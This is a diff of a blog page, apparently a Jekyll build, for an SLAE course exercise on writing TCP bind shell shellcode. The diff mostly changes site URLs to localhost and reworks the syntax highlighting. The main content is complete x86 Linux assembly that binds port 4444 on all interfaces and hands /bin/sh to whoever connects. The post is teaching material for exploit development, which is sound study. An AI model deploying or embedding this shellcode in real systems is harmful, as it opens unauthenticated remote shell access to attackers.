@@ -9,19 +9,19 @@
 
   <meta property="og:title" content="SLAE Problem 1: TCP Bind Shell Shellcode">
   <meta property="og:type" content="website">
-  <meta property="og:url" content="http://brettlischalk.com//posts/slae-problem-1-tcp-bind-shellcode">
+  <meta property="og:url" content="http://localhost:4000/posts/slae-problem-1-tcp-bind-shellcode">
   <meta property="og:description" content="From my experience playing around with socket programming in C and Python, there is a basic formula and group of function calls for creating clients and servers. Most of them will be useful to us. A couple won't be applicable to our situation.">
   <meta property="og:site_name" content="Brett Lischalk">
-  <meta property="og:image" content="http://brettlischalk.com//assets/og-image.jpg">
+  <meta property="og:image" content="http://localhost:4000/assets/og-image.jpg">
 
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:url" content="http://brettlischalk.com//posts/slae-problem-1-tcp-bind-shellcode">
+  <meta name="twitter:url" content="http://localhost:4000/posts/slae-problem-1-tcp-bind-shellcode">
   <meta name="twitter:title" content="SLAE Problem 1: TCP Bind Shell Shellcode">
   <meta name="twitter:description" content="From my experience playing around with socket programming in C and Python, there is a basic formula and group of function calls for creating clients and servers. Most of them will be useful to us. A couple won't be applicable to our situation.">
-  <meta name="twitter:image" content="http://brettlischalk.com//assets/og-image.jpg">
+  <meta name="twitter:image" content="http://localhost:4000/assets/og-image.jpg">
 
   <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
-  <link href="http://brettlischalk.com//feed.xml" type="application/rss+xml" rel="alternate" title="Brett Lischalk Last 10 blog posts" />
+  <link href="http://localhost:4000/feed.xml" type="application/rss+xml" rel="alternate" title="Brett Lischalk Last 10 blog posts" />
 
   
     <link type="text/css" rel="stylesheet" href="/assets/dark.css">
@@ -96,7 +96,7 @@
               <span class="article-list-minutes">
                 
                 
-                  15 minute read
+                  16 minute read
                 
               </span>
               <span class="article-list-divider">-</span>
@@ -382,116 +382,116 @@ int lsock <span class="o">=</span> socket<span class="o">(</span>2, SOCK_STREAM,
 
 <p>And now the assembly:</p>
 
-<figure class="highlight"><pre><code class="language-assembly" data-lang="assembly">global _start
- Note: We will store 2 file descriptors along the way
- We will put the listening socket file descriptor in edi
- We will put the connection socket file descriptor in ebx
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="kr">global</span> <span class="n">_start</span>
+ <span class="n">Note</span><span class="o">:</span> <span class="n">We</span> <span class="n">will</span> <span class="n">store</span> <span class="mi">2</span> <span class="n">file</span> <span class="n">descriptors</span> <span class="n">along</span> <span class="n">the</span> <span class="n">way</span>
+ <span class="n">We</span> <span class="n">will</span> <span class="n">put</span> <span class="n">the</span> <span class="n">listening</span> <span class="n">socket</span> <span class="n">file</span> <span class="n">descriptor</span> <span class="k">in</span> <span class="n">edi</span>
+ <span class="n">We</span> <span class="n">will</span> <span class="n">put</span> <span class="n">the</span> <span class="n">connection</span> <span class="n">socket</span> <span class="n">file</span> <span class="n">descriptor</span> <span class="k">in</span> <span class="n">ebx</span>
 
-section .text
-_start:
-  ;; Create a socket
-  ;; int socketcall(int call, unsigned long *args);
-  ;; int socket(int domain, int type, int protocol);
-  ;; #define SYS_SOCKET 1   /* sys_socket(2)    */
-  ;; Use socketcall to call down to socket
-  xor eax, eax
-  mov al, 0x66 ; socketcall syscall
-  xor ebx, ebx
-  mov bl, 0x1 ; sys_socket syscall number
+<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+<span class="n">_start</span><span class="o">:</span>
+  <span class="c">;; Create a socket</span>
+  <span class="c">;; int socketcall(int call, unsigned long *args);</span>
+  <span class="c">;; int socket(int domain, int type, int protocol);</span>
+  <span class="c">;; #define SYS_SOCKET 1   /* sys_socket(2)    */</span>
+  <span class="c">;; Use socketcall to call down to socket</span>
+  <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
+  <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">; socketcall syscall</span>
+  <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
+  <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x1</span> <span class="c">; sys_socket syscall number</span>
 
-  ;; Put the socket() args on the stack
-  xor ecx, ecx
-  push ecx ; INADDR_ANY Accept on any interface 0x00000000
-  push ebx ; SOCK_STREAM is the type of socket 1
-  push 0x2 ; Protocol AF_INET is the IP Protocol 2
+  <span class="c">;; Put the socket() args on the stack</span>
+  <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
+  <span class="k">push</span> <span class="n">ecx</span> <span class="c">; INADDR_ANY Accept on any interface 0x00000000</span>
+  <span class="k">push</span> <span class="n">ebx</span> <span class="c">; SOCK_STREAM is the type of socket 1</span>
+  <span class="k">push</span> <span class="mh">0x2</span> <span class="c">; Protocol AF_INET is the IP Protocol 2</span>
 
-  mov ecx, esp ; Save pointer to args for the socket() call
-  int 0x80 ; call sys_socket
+  <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">; Save pointer to args for the socket() call</span>
+  <span class="k">int</span> <span class="mh">0x80</span> <span class="c">; call sys_socket</span>
 
-  ; Save the returned listening socket file descriptor
-  xor edi, edi
-  mov edi, eax
+  <span class="c">; Save the returned listening socket file descriptor</span>
+  <span class="k">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>
+  <span class="k">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>
 
-  ;; Bind the socket
-  ;; Use socketcall to call down to socket
-  xor eax, eax
-  mov al, 0x66 ; socketcall syscall
-  xor ebx, ebx
-  mov bl, 0x2 ; sys_bind syscall number
+  <span class="c">;; Bind the socket</span>
+  <span class="c">;; Use socketcall to call down to socket</span>
+  <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
+  <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">; socketcall syscall</span>
+  <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
+  <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x2</span> <span class="c">; sys_bind syscall number</span>
 
-  ;; Start building the sockaddr_in structure
-  ;; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
-  ; sin_addr=0 (INADDR_ANY)
-  ; INADDR_ANY Accept on any interface 0x00000000
-  xor ecx, ecx
-  push ecx
+  <span class="c">;; Start building the sockaddr_in structure</span>
+  <span class="c">;; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</span>
+  <span class="c">; sin_addr=0 (INADDR_ANY)</span>
+  <span class="c">; INADDR_ANY Accept on any interface 0x00000000</span>
+  <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
+  <span class="k">push</span> <span class="n">ecx</span>
 
-  ;; 4444 is 0x115c in little endian. Network byte order is
-  ;; Big endian so we swap the byte ordering
-  push word 0x5c11 ; sin_port=4444 (network byte order)
-  push word bx     ; sin_family=AF_INET (0x2)
-  mov ecx, esp     ; move pointer to sockaddr_in structure
+  <span class="c">;; 4444 is 0x115c in little endian. Network byte order is</span>
+  <span class="c">;; Big endian so we swap the byte ordering</span>
+  <span class="k">push</span> <span class="n">word</span> <span class="mh">0x5c11</span> <span class="c">; sin_port=4444 (network byte order)</span>
+  <span class="k">push</span> <span class="n">word</span> <span class="n">bx</span>     <span class="c">; sin_family=AF_INET (0x2)</span>
+  <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>     <span class="c">; move pointer to sockaddr_in structure</span>
 
-  ;; In the initial code we use sizeof to derive the addrlen
-  ;; If we print the results of that we get 0x10 which is 16 bytes
-  push 0x10 ;addrlen=16
-  push ecx  ;struct sockaddr pointer
-  push edi  ;sockfd
-  mov ecx, esp ;save pointer to bind() args
-  int 0x80 ; call sys_bind
+  <span class="c">;; In the initial code we use sizeof to derive the addrlen</span>
+  <span class="c">;; If we print the results of that we get 0x10 which is 16 bytes</span>
+  <span class="k">push</span> <span class="mh">0x10</span> <span class="c">;addrlen=16</span>
+  <span class="k">push</span> <span class="n">ecx</span>  <span class="c">;struct sockaddr pointer</span>
+  <span class="k">push</span> <span class="n">edi</span>  <span class="c">;sockfd</span>
+  <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">;save pointer to bind() args</span>
+  <span class="k">int</span> <span class="mh">0x80</span> <span class="c">; call sys_bind</span>
 
-  ;; Call listen and prepare for accepting connections
-  xor eax, eax
-  mov al, 0x66 ; socketcall syscall
-  xor ebx, ebx
-  mov bl, 0x4 ; sys_listen syscall number
+  <span class="c">;; Call listen and prepare for accepting connections</span>
+  <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
+  <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">; socketcall syscall</span>
+  <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
+  <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x4</span> <span class="c">; sys_listen syscall number</span>
 
-  ;; Place listen's arguments on the stack
-  xor ecx, ecx
-  push ecx ; backlog we set to zero
-  push edi ; push the socket file descriptor
-  mov ecx, esp ; place a pointer to the args in ecx
-  int 0x80 ; call sys_listen
+  <span class="c">;; Place listen's arguments on the stack</span>
+  <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
+  <span class="k">push</span> <span class="n">ecx</span> <span class="c">; backlog we set to zero</span>
+  <span class="k">push</span> <span class="n">edi</span> <span class="c">; push the socket file descriptor</span>
+  <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">; place a pointer to the args in ecx</span>
+  <span class="k">int</span> <span class="mh">0x80</span> <span class="c">; call sys_listen</span>
 
-  ;; Call accept
-  xor eax, eax
-  mov al, 0x66 ; socketcall syscall
-  xor ebx, ebx
-  mov bl, 0x5 ; sys_accept syscall number
-  ;; Place accept's arguments on the stack
-  ;; We don't need a peer socket???... so we
-  ;; use nulls for addrlen and sockaddr struct
-  xor ecx, ecx
-  push ecx ; Push NULL (0x00000000) for addrlen
-  push ecx ; Push NULL (0x00000000) for sockaddr struct
-  push edi ; Push the listening sockets file descriptor
-  mov ecx, esp ; place a pointer to the args in ecx
-  int 0x80 ; call sys_accept
+  <span class="c">;; Call accept</span>
+  <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
+  <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">; socketcall syscall</span>
+  <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
+  <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x5</span> <span class="c">; sys_accept syscall number</span>
+  <span class="c">;; Place accept's arguments on the stack</span>
+  <span class="c">;; We don't need a peer socket???... so we</span>
+  <span class="c">;; use nulls for addrlen and sockaddr struct</span>
+  <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
+  <span class="k">push</span> <span class="n">ecx</span> <span class="c">; Push NULL (0x00000000) for addrlen</span>
+  <span class="k">push</span> <span class="n">ecx</span> <span class="c">; Push NULL (0x00000000) for sockaddr struct</span>
+  <span class="k">push</span> <span class="n">edi</span> <span class="c">; Push the listening sockets file descriptor</span>
+  <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">; place a pointer to the args in ecx</span>
+  <span class="k">int</span> <span class="mh">0x80</span> <span class="c">; call sys_accept</span>
 
-  ;; Save the returned connection socket file descriptor
-  xor ebx, ebx
-  mov ebx, eax
+  <span class="c">;; Save the returned connection socket file descriptor</span>
+  <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
+  <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">eax</span>
 
-  ;; Call dup2 for stdin, stdout, and stderr in a loop
-  xor ecx, ecx
-  mov cl, 0x2 ;loop counter
-dup2:
-  mov al, 0x3f ;dup2
-  int 0x80
-  dec ecx
-  jns dup2
+  <span class="c">;; Call dup2 for stdin, stdout, and stderr in a loop</span>
+  <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
+  <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mh">0x2</span> <span class="c">;loop counter</span>
+<span class="n">dup2</span><span class="o">:</span>
+  <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3f</span> <span class="c">;dup2</span>
+  <span class="k">int</span> <span class="mh">0x80</span>
+  <span class="k">dec</span> <span class="n">ecx</span>
+  <span class="k">jns</span> <span class="n">dup2</span>
 
-  ;; Call execve
-  xor eax, eax
-  mov al, 0xb ;execve
-  xor ebx, ebx
-  push ebx
-  push 0x68732f2f ;"sh//"
-  push 0x6e69622f ;"nib/"
-  mov ebx, esp
-  xor ecx, ecx
-  xor edx, edx
-  int 0x80</code></pre></figure>
+  <span class="c">;; Call execve</span>
+  <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
+  <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0xb</span> <span class="c">;execve</span>
+  <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
+  <span class="k">push</span> <span class="n">ebx</span>
+  <span class="k">push</span> <span class="mh">0x68732f2f</span> <span class="c">;"sh//"</span>
+  <span class="k">push</span> <span class="mh">0x6e69622f</span> <span class="c">;"nib/"</span>
+  <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>
+  <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
+  <span class="k">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>
+  <span class="k">int</span> <span class="mh">0x80</span></code></pre></figure>
 
 <p>When we compile the above shellcode using the compile.sh script below:</p>
 
@@ -603,17 +603,32 @@ shellcode.</p>
 
           <div class="article-share">
             
-            <a href="" title="Share on Twitter" onclick="window.open('https://twitter.com/home?status=SLAE Problem 1: TCP Bind Shell Shellcode - http://brettlischalk.com//posts/slae-problem-1-tcp-bind-shellcode by @blischalk', 'newwindow', 'width=500, height=225'); return false;">
+            <a href="" title="Share on Twitter" onclick="window.open('https://twitter.com/home?status=SLAE Problem 1: TCP Bind Shell Shellcode - http://localhost:4000/posts/slae-problem-1-tcp-bind-shellcode by @blischalk', 'newwindow', 'width=500, height=225'); return false;">
               <span class="icon icon-social-twitter"></span>
             </a>
-            <a href="" title="Share on Facebook" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=http://brettlischalk.com//posts/slae-problem-1-tcp-bind-shellcode', 'newwindow', 'width=500, height=500'); return false;">
+            <a href="" title="Share on Facebook" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/posts/slae-problem-1-tcp-bind-shellcode', 'newwindow', 'width=500, height=500'); return false;">
               <span class="icon icon-social-facebook"></span>
             </a>
-            <a href="" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=http://brettlischalk.com//posts/slae-problem-1-tcp-bind-shellcode', 'newwindow', 'width=550, height=400'); return false;">
+            <a href="" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=http://localhost:4000/posts/slae-problem-1-tcp-bind-shellcode', 'newwindow', 'width=550, height=400'); return false;">
               <span class="icon icon-social-googleplus"></span>
             </a>
           </div>
 
+          <a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional" target="_blank">
+            <img src="/assets/offsec-student-certified-emblem-rgb-oscp.png"" />
+          </a>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script>
+              (function() {
+                  var d = document, s = d.createElement('script');
+                  s.src = '//blischalkblog.disqus.com/embed.js';
+                  s.setAttribute('data-timestamp', +new Date());
+                  (d.head || d.body).appendChild(s);
+              })();
+            </script>
+            <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
           
         </article>
         <footer class="footer reveal">
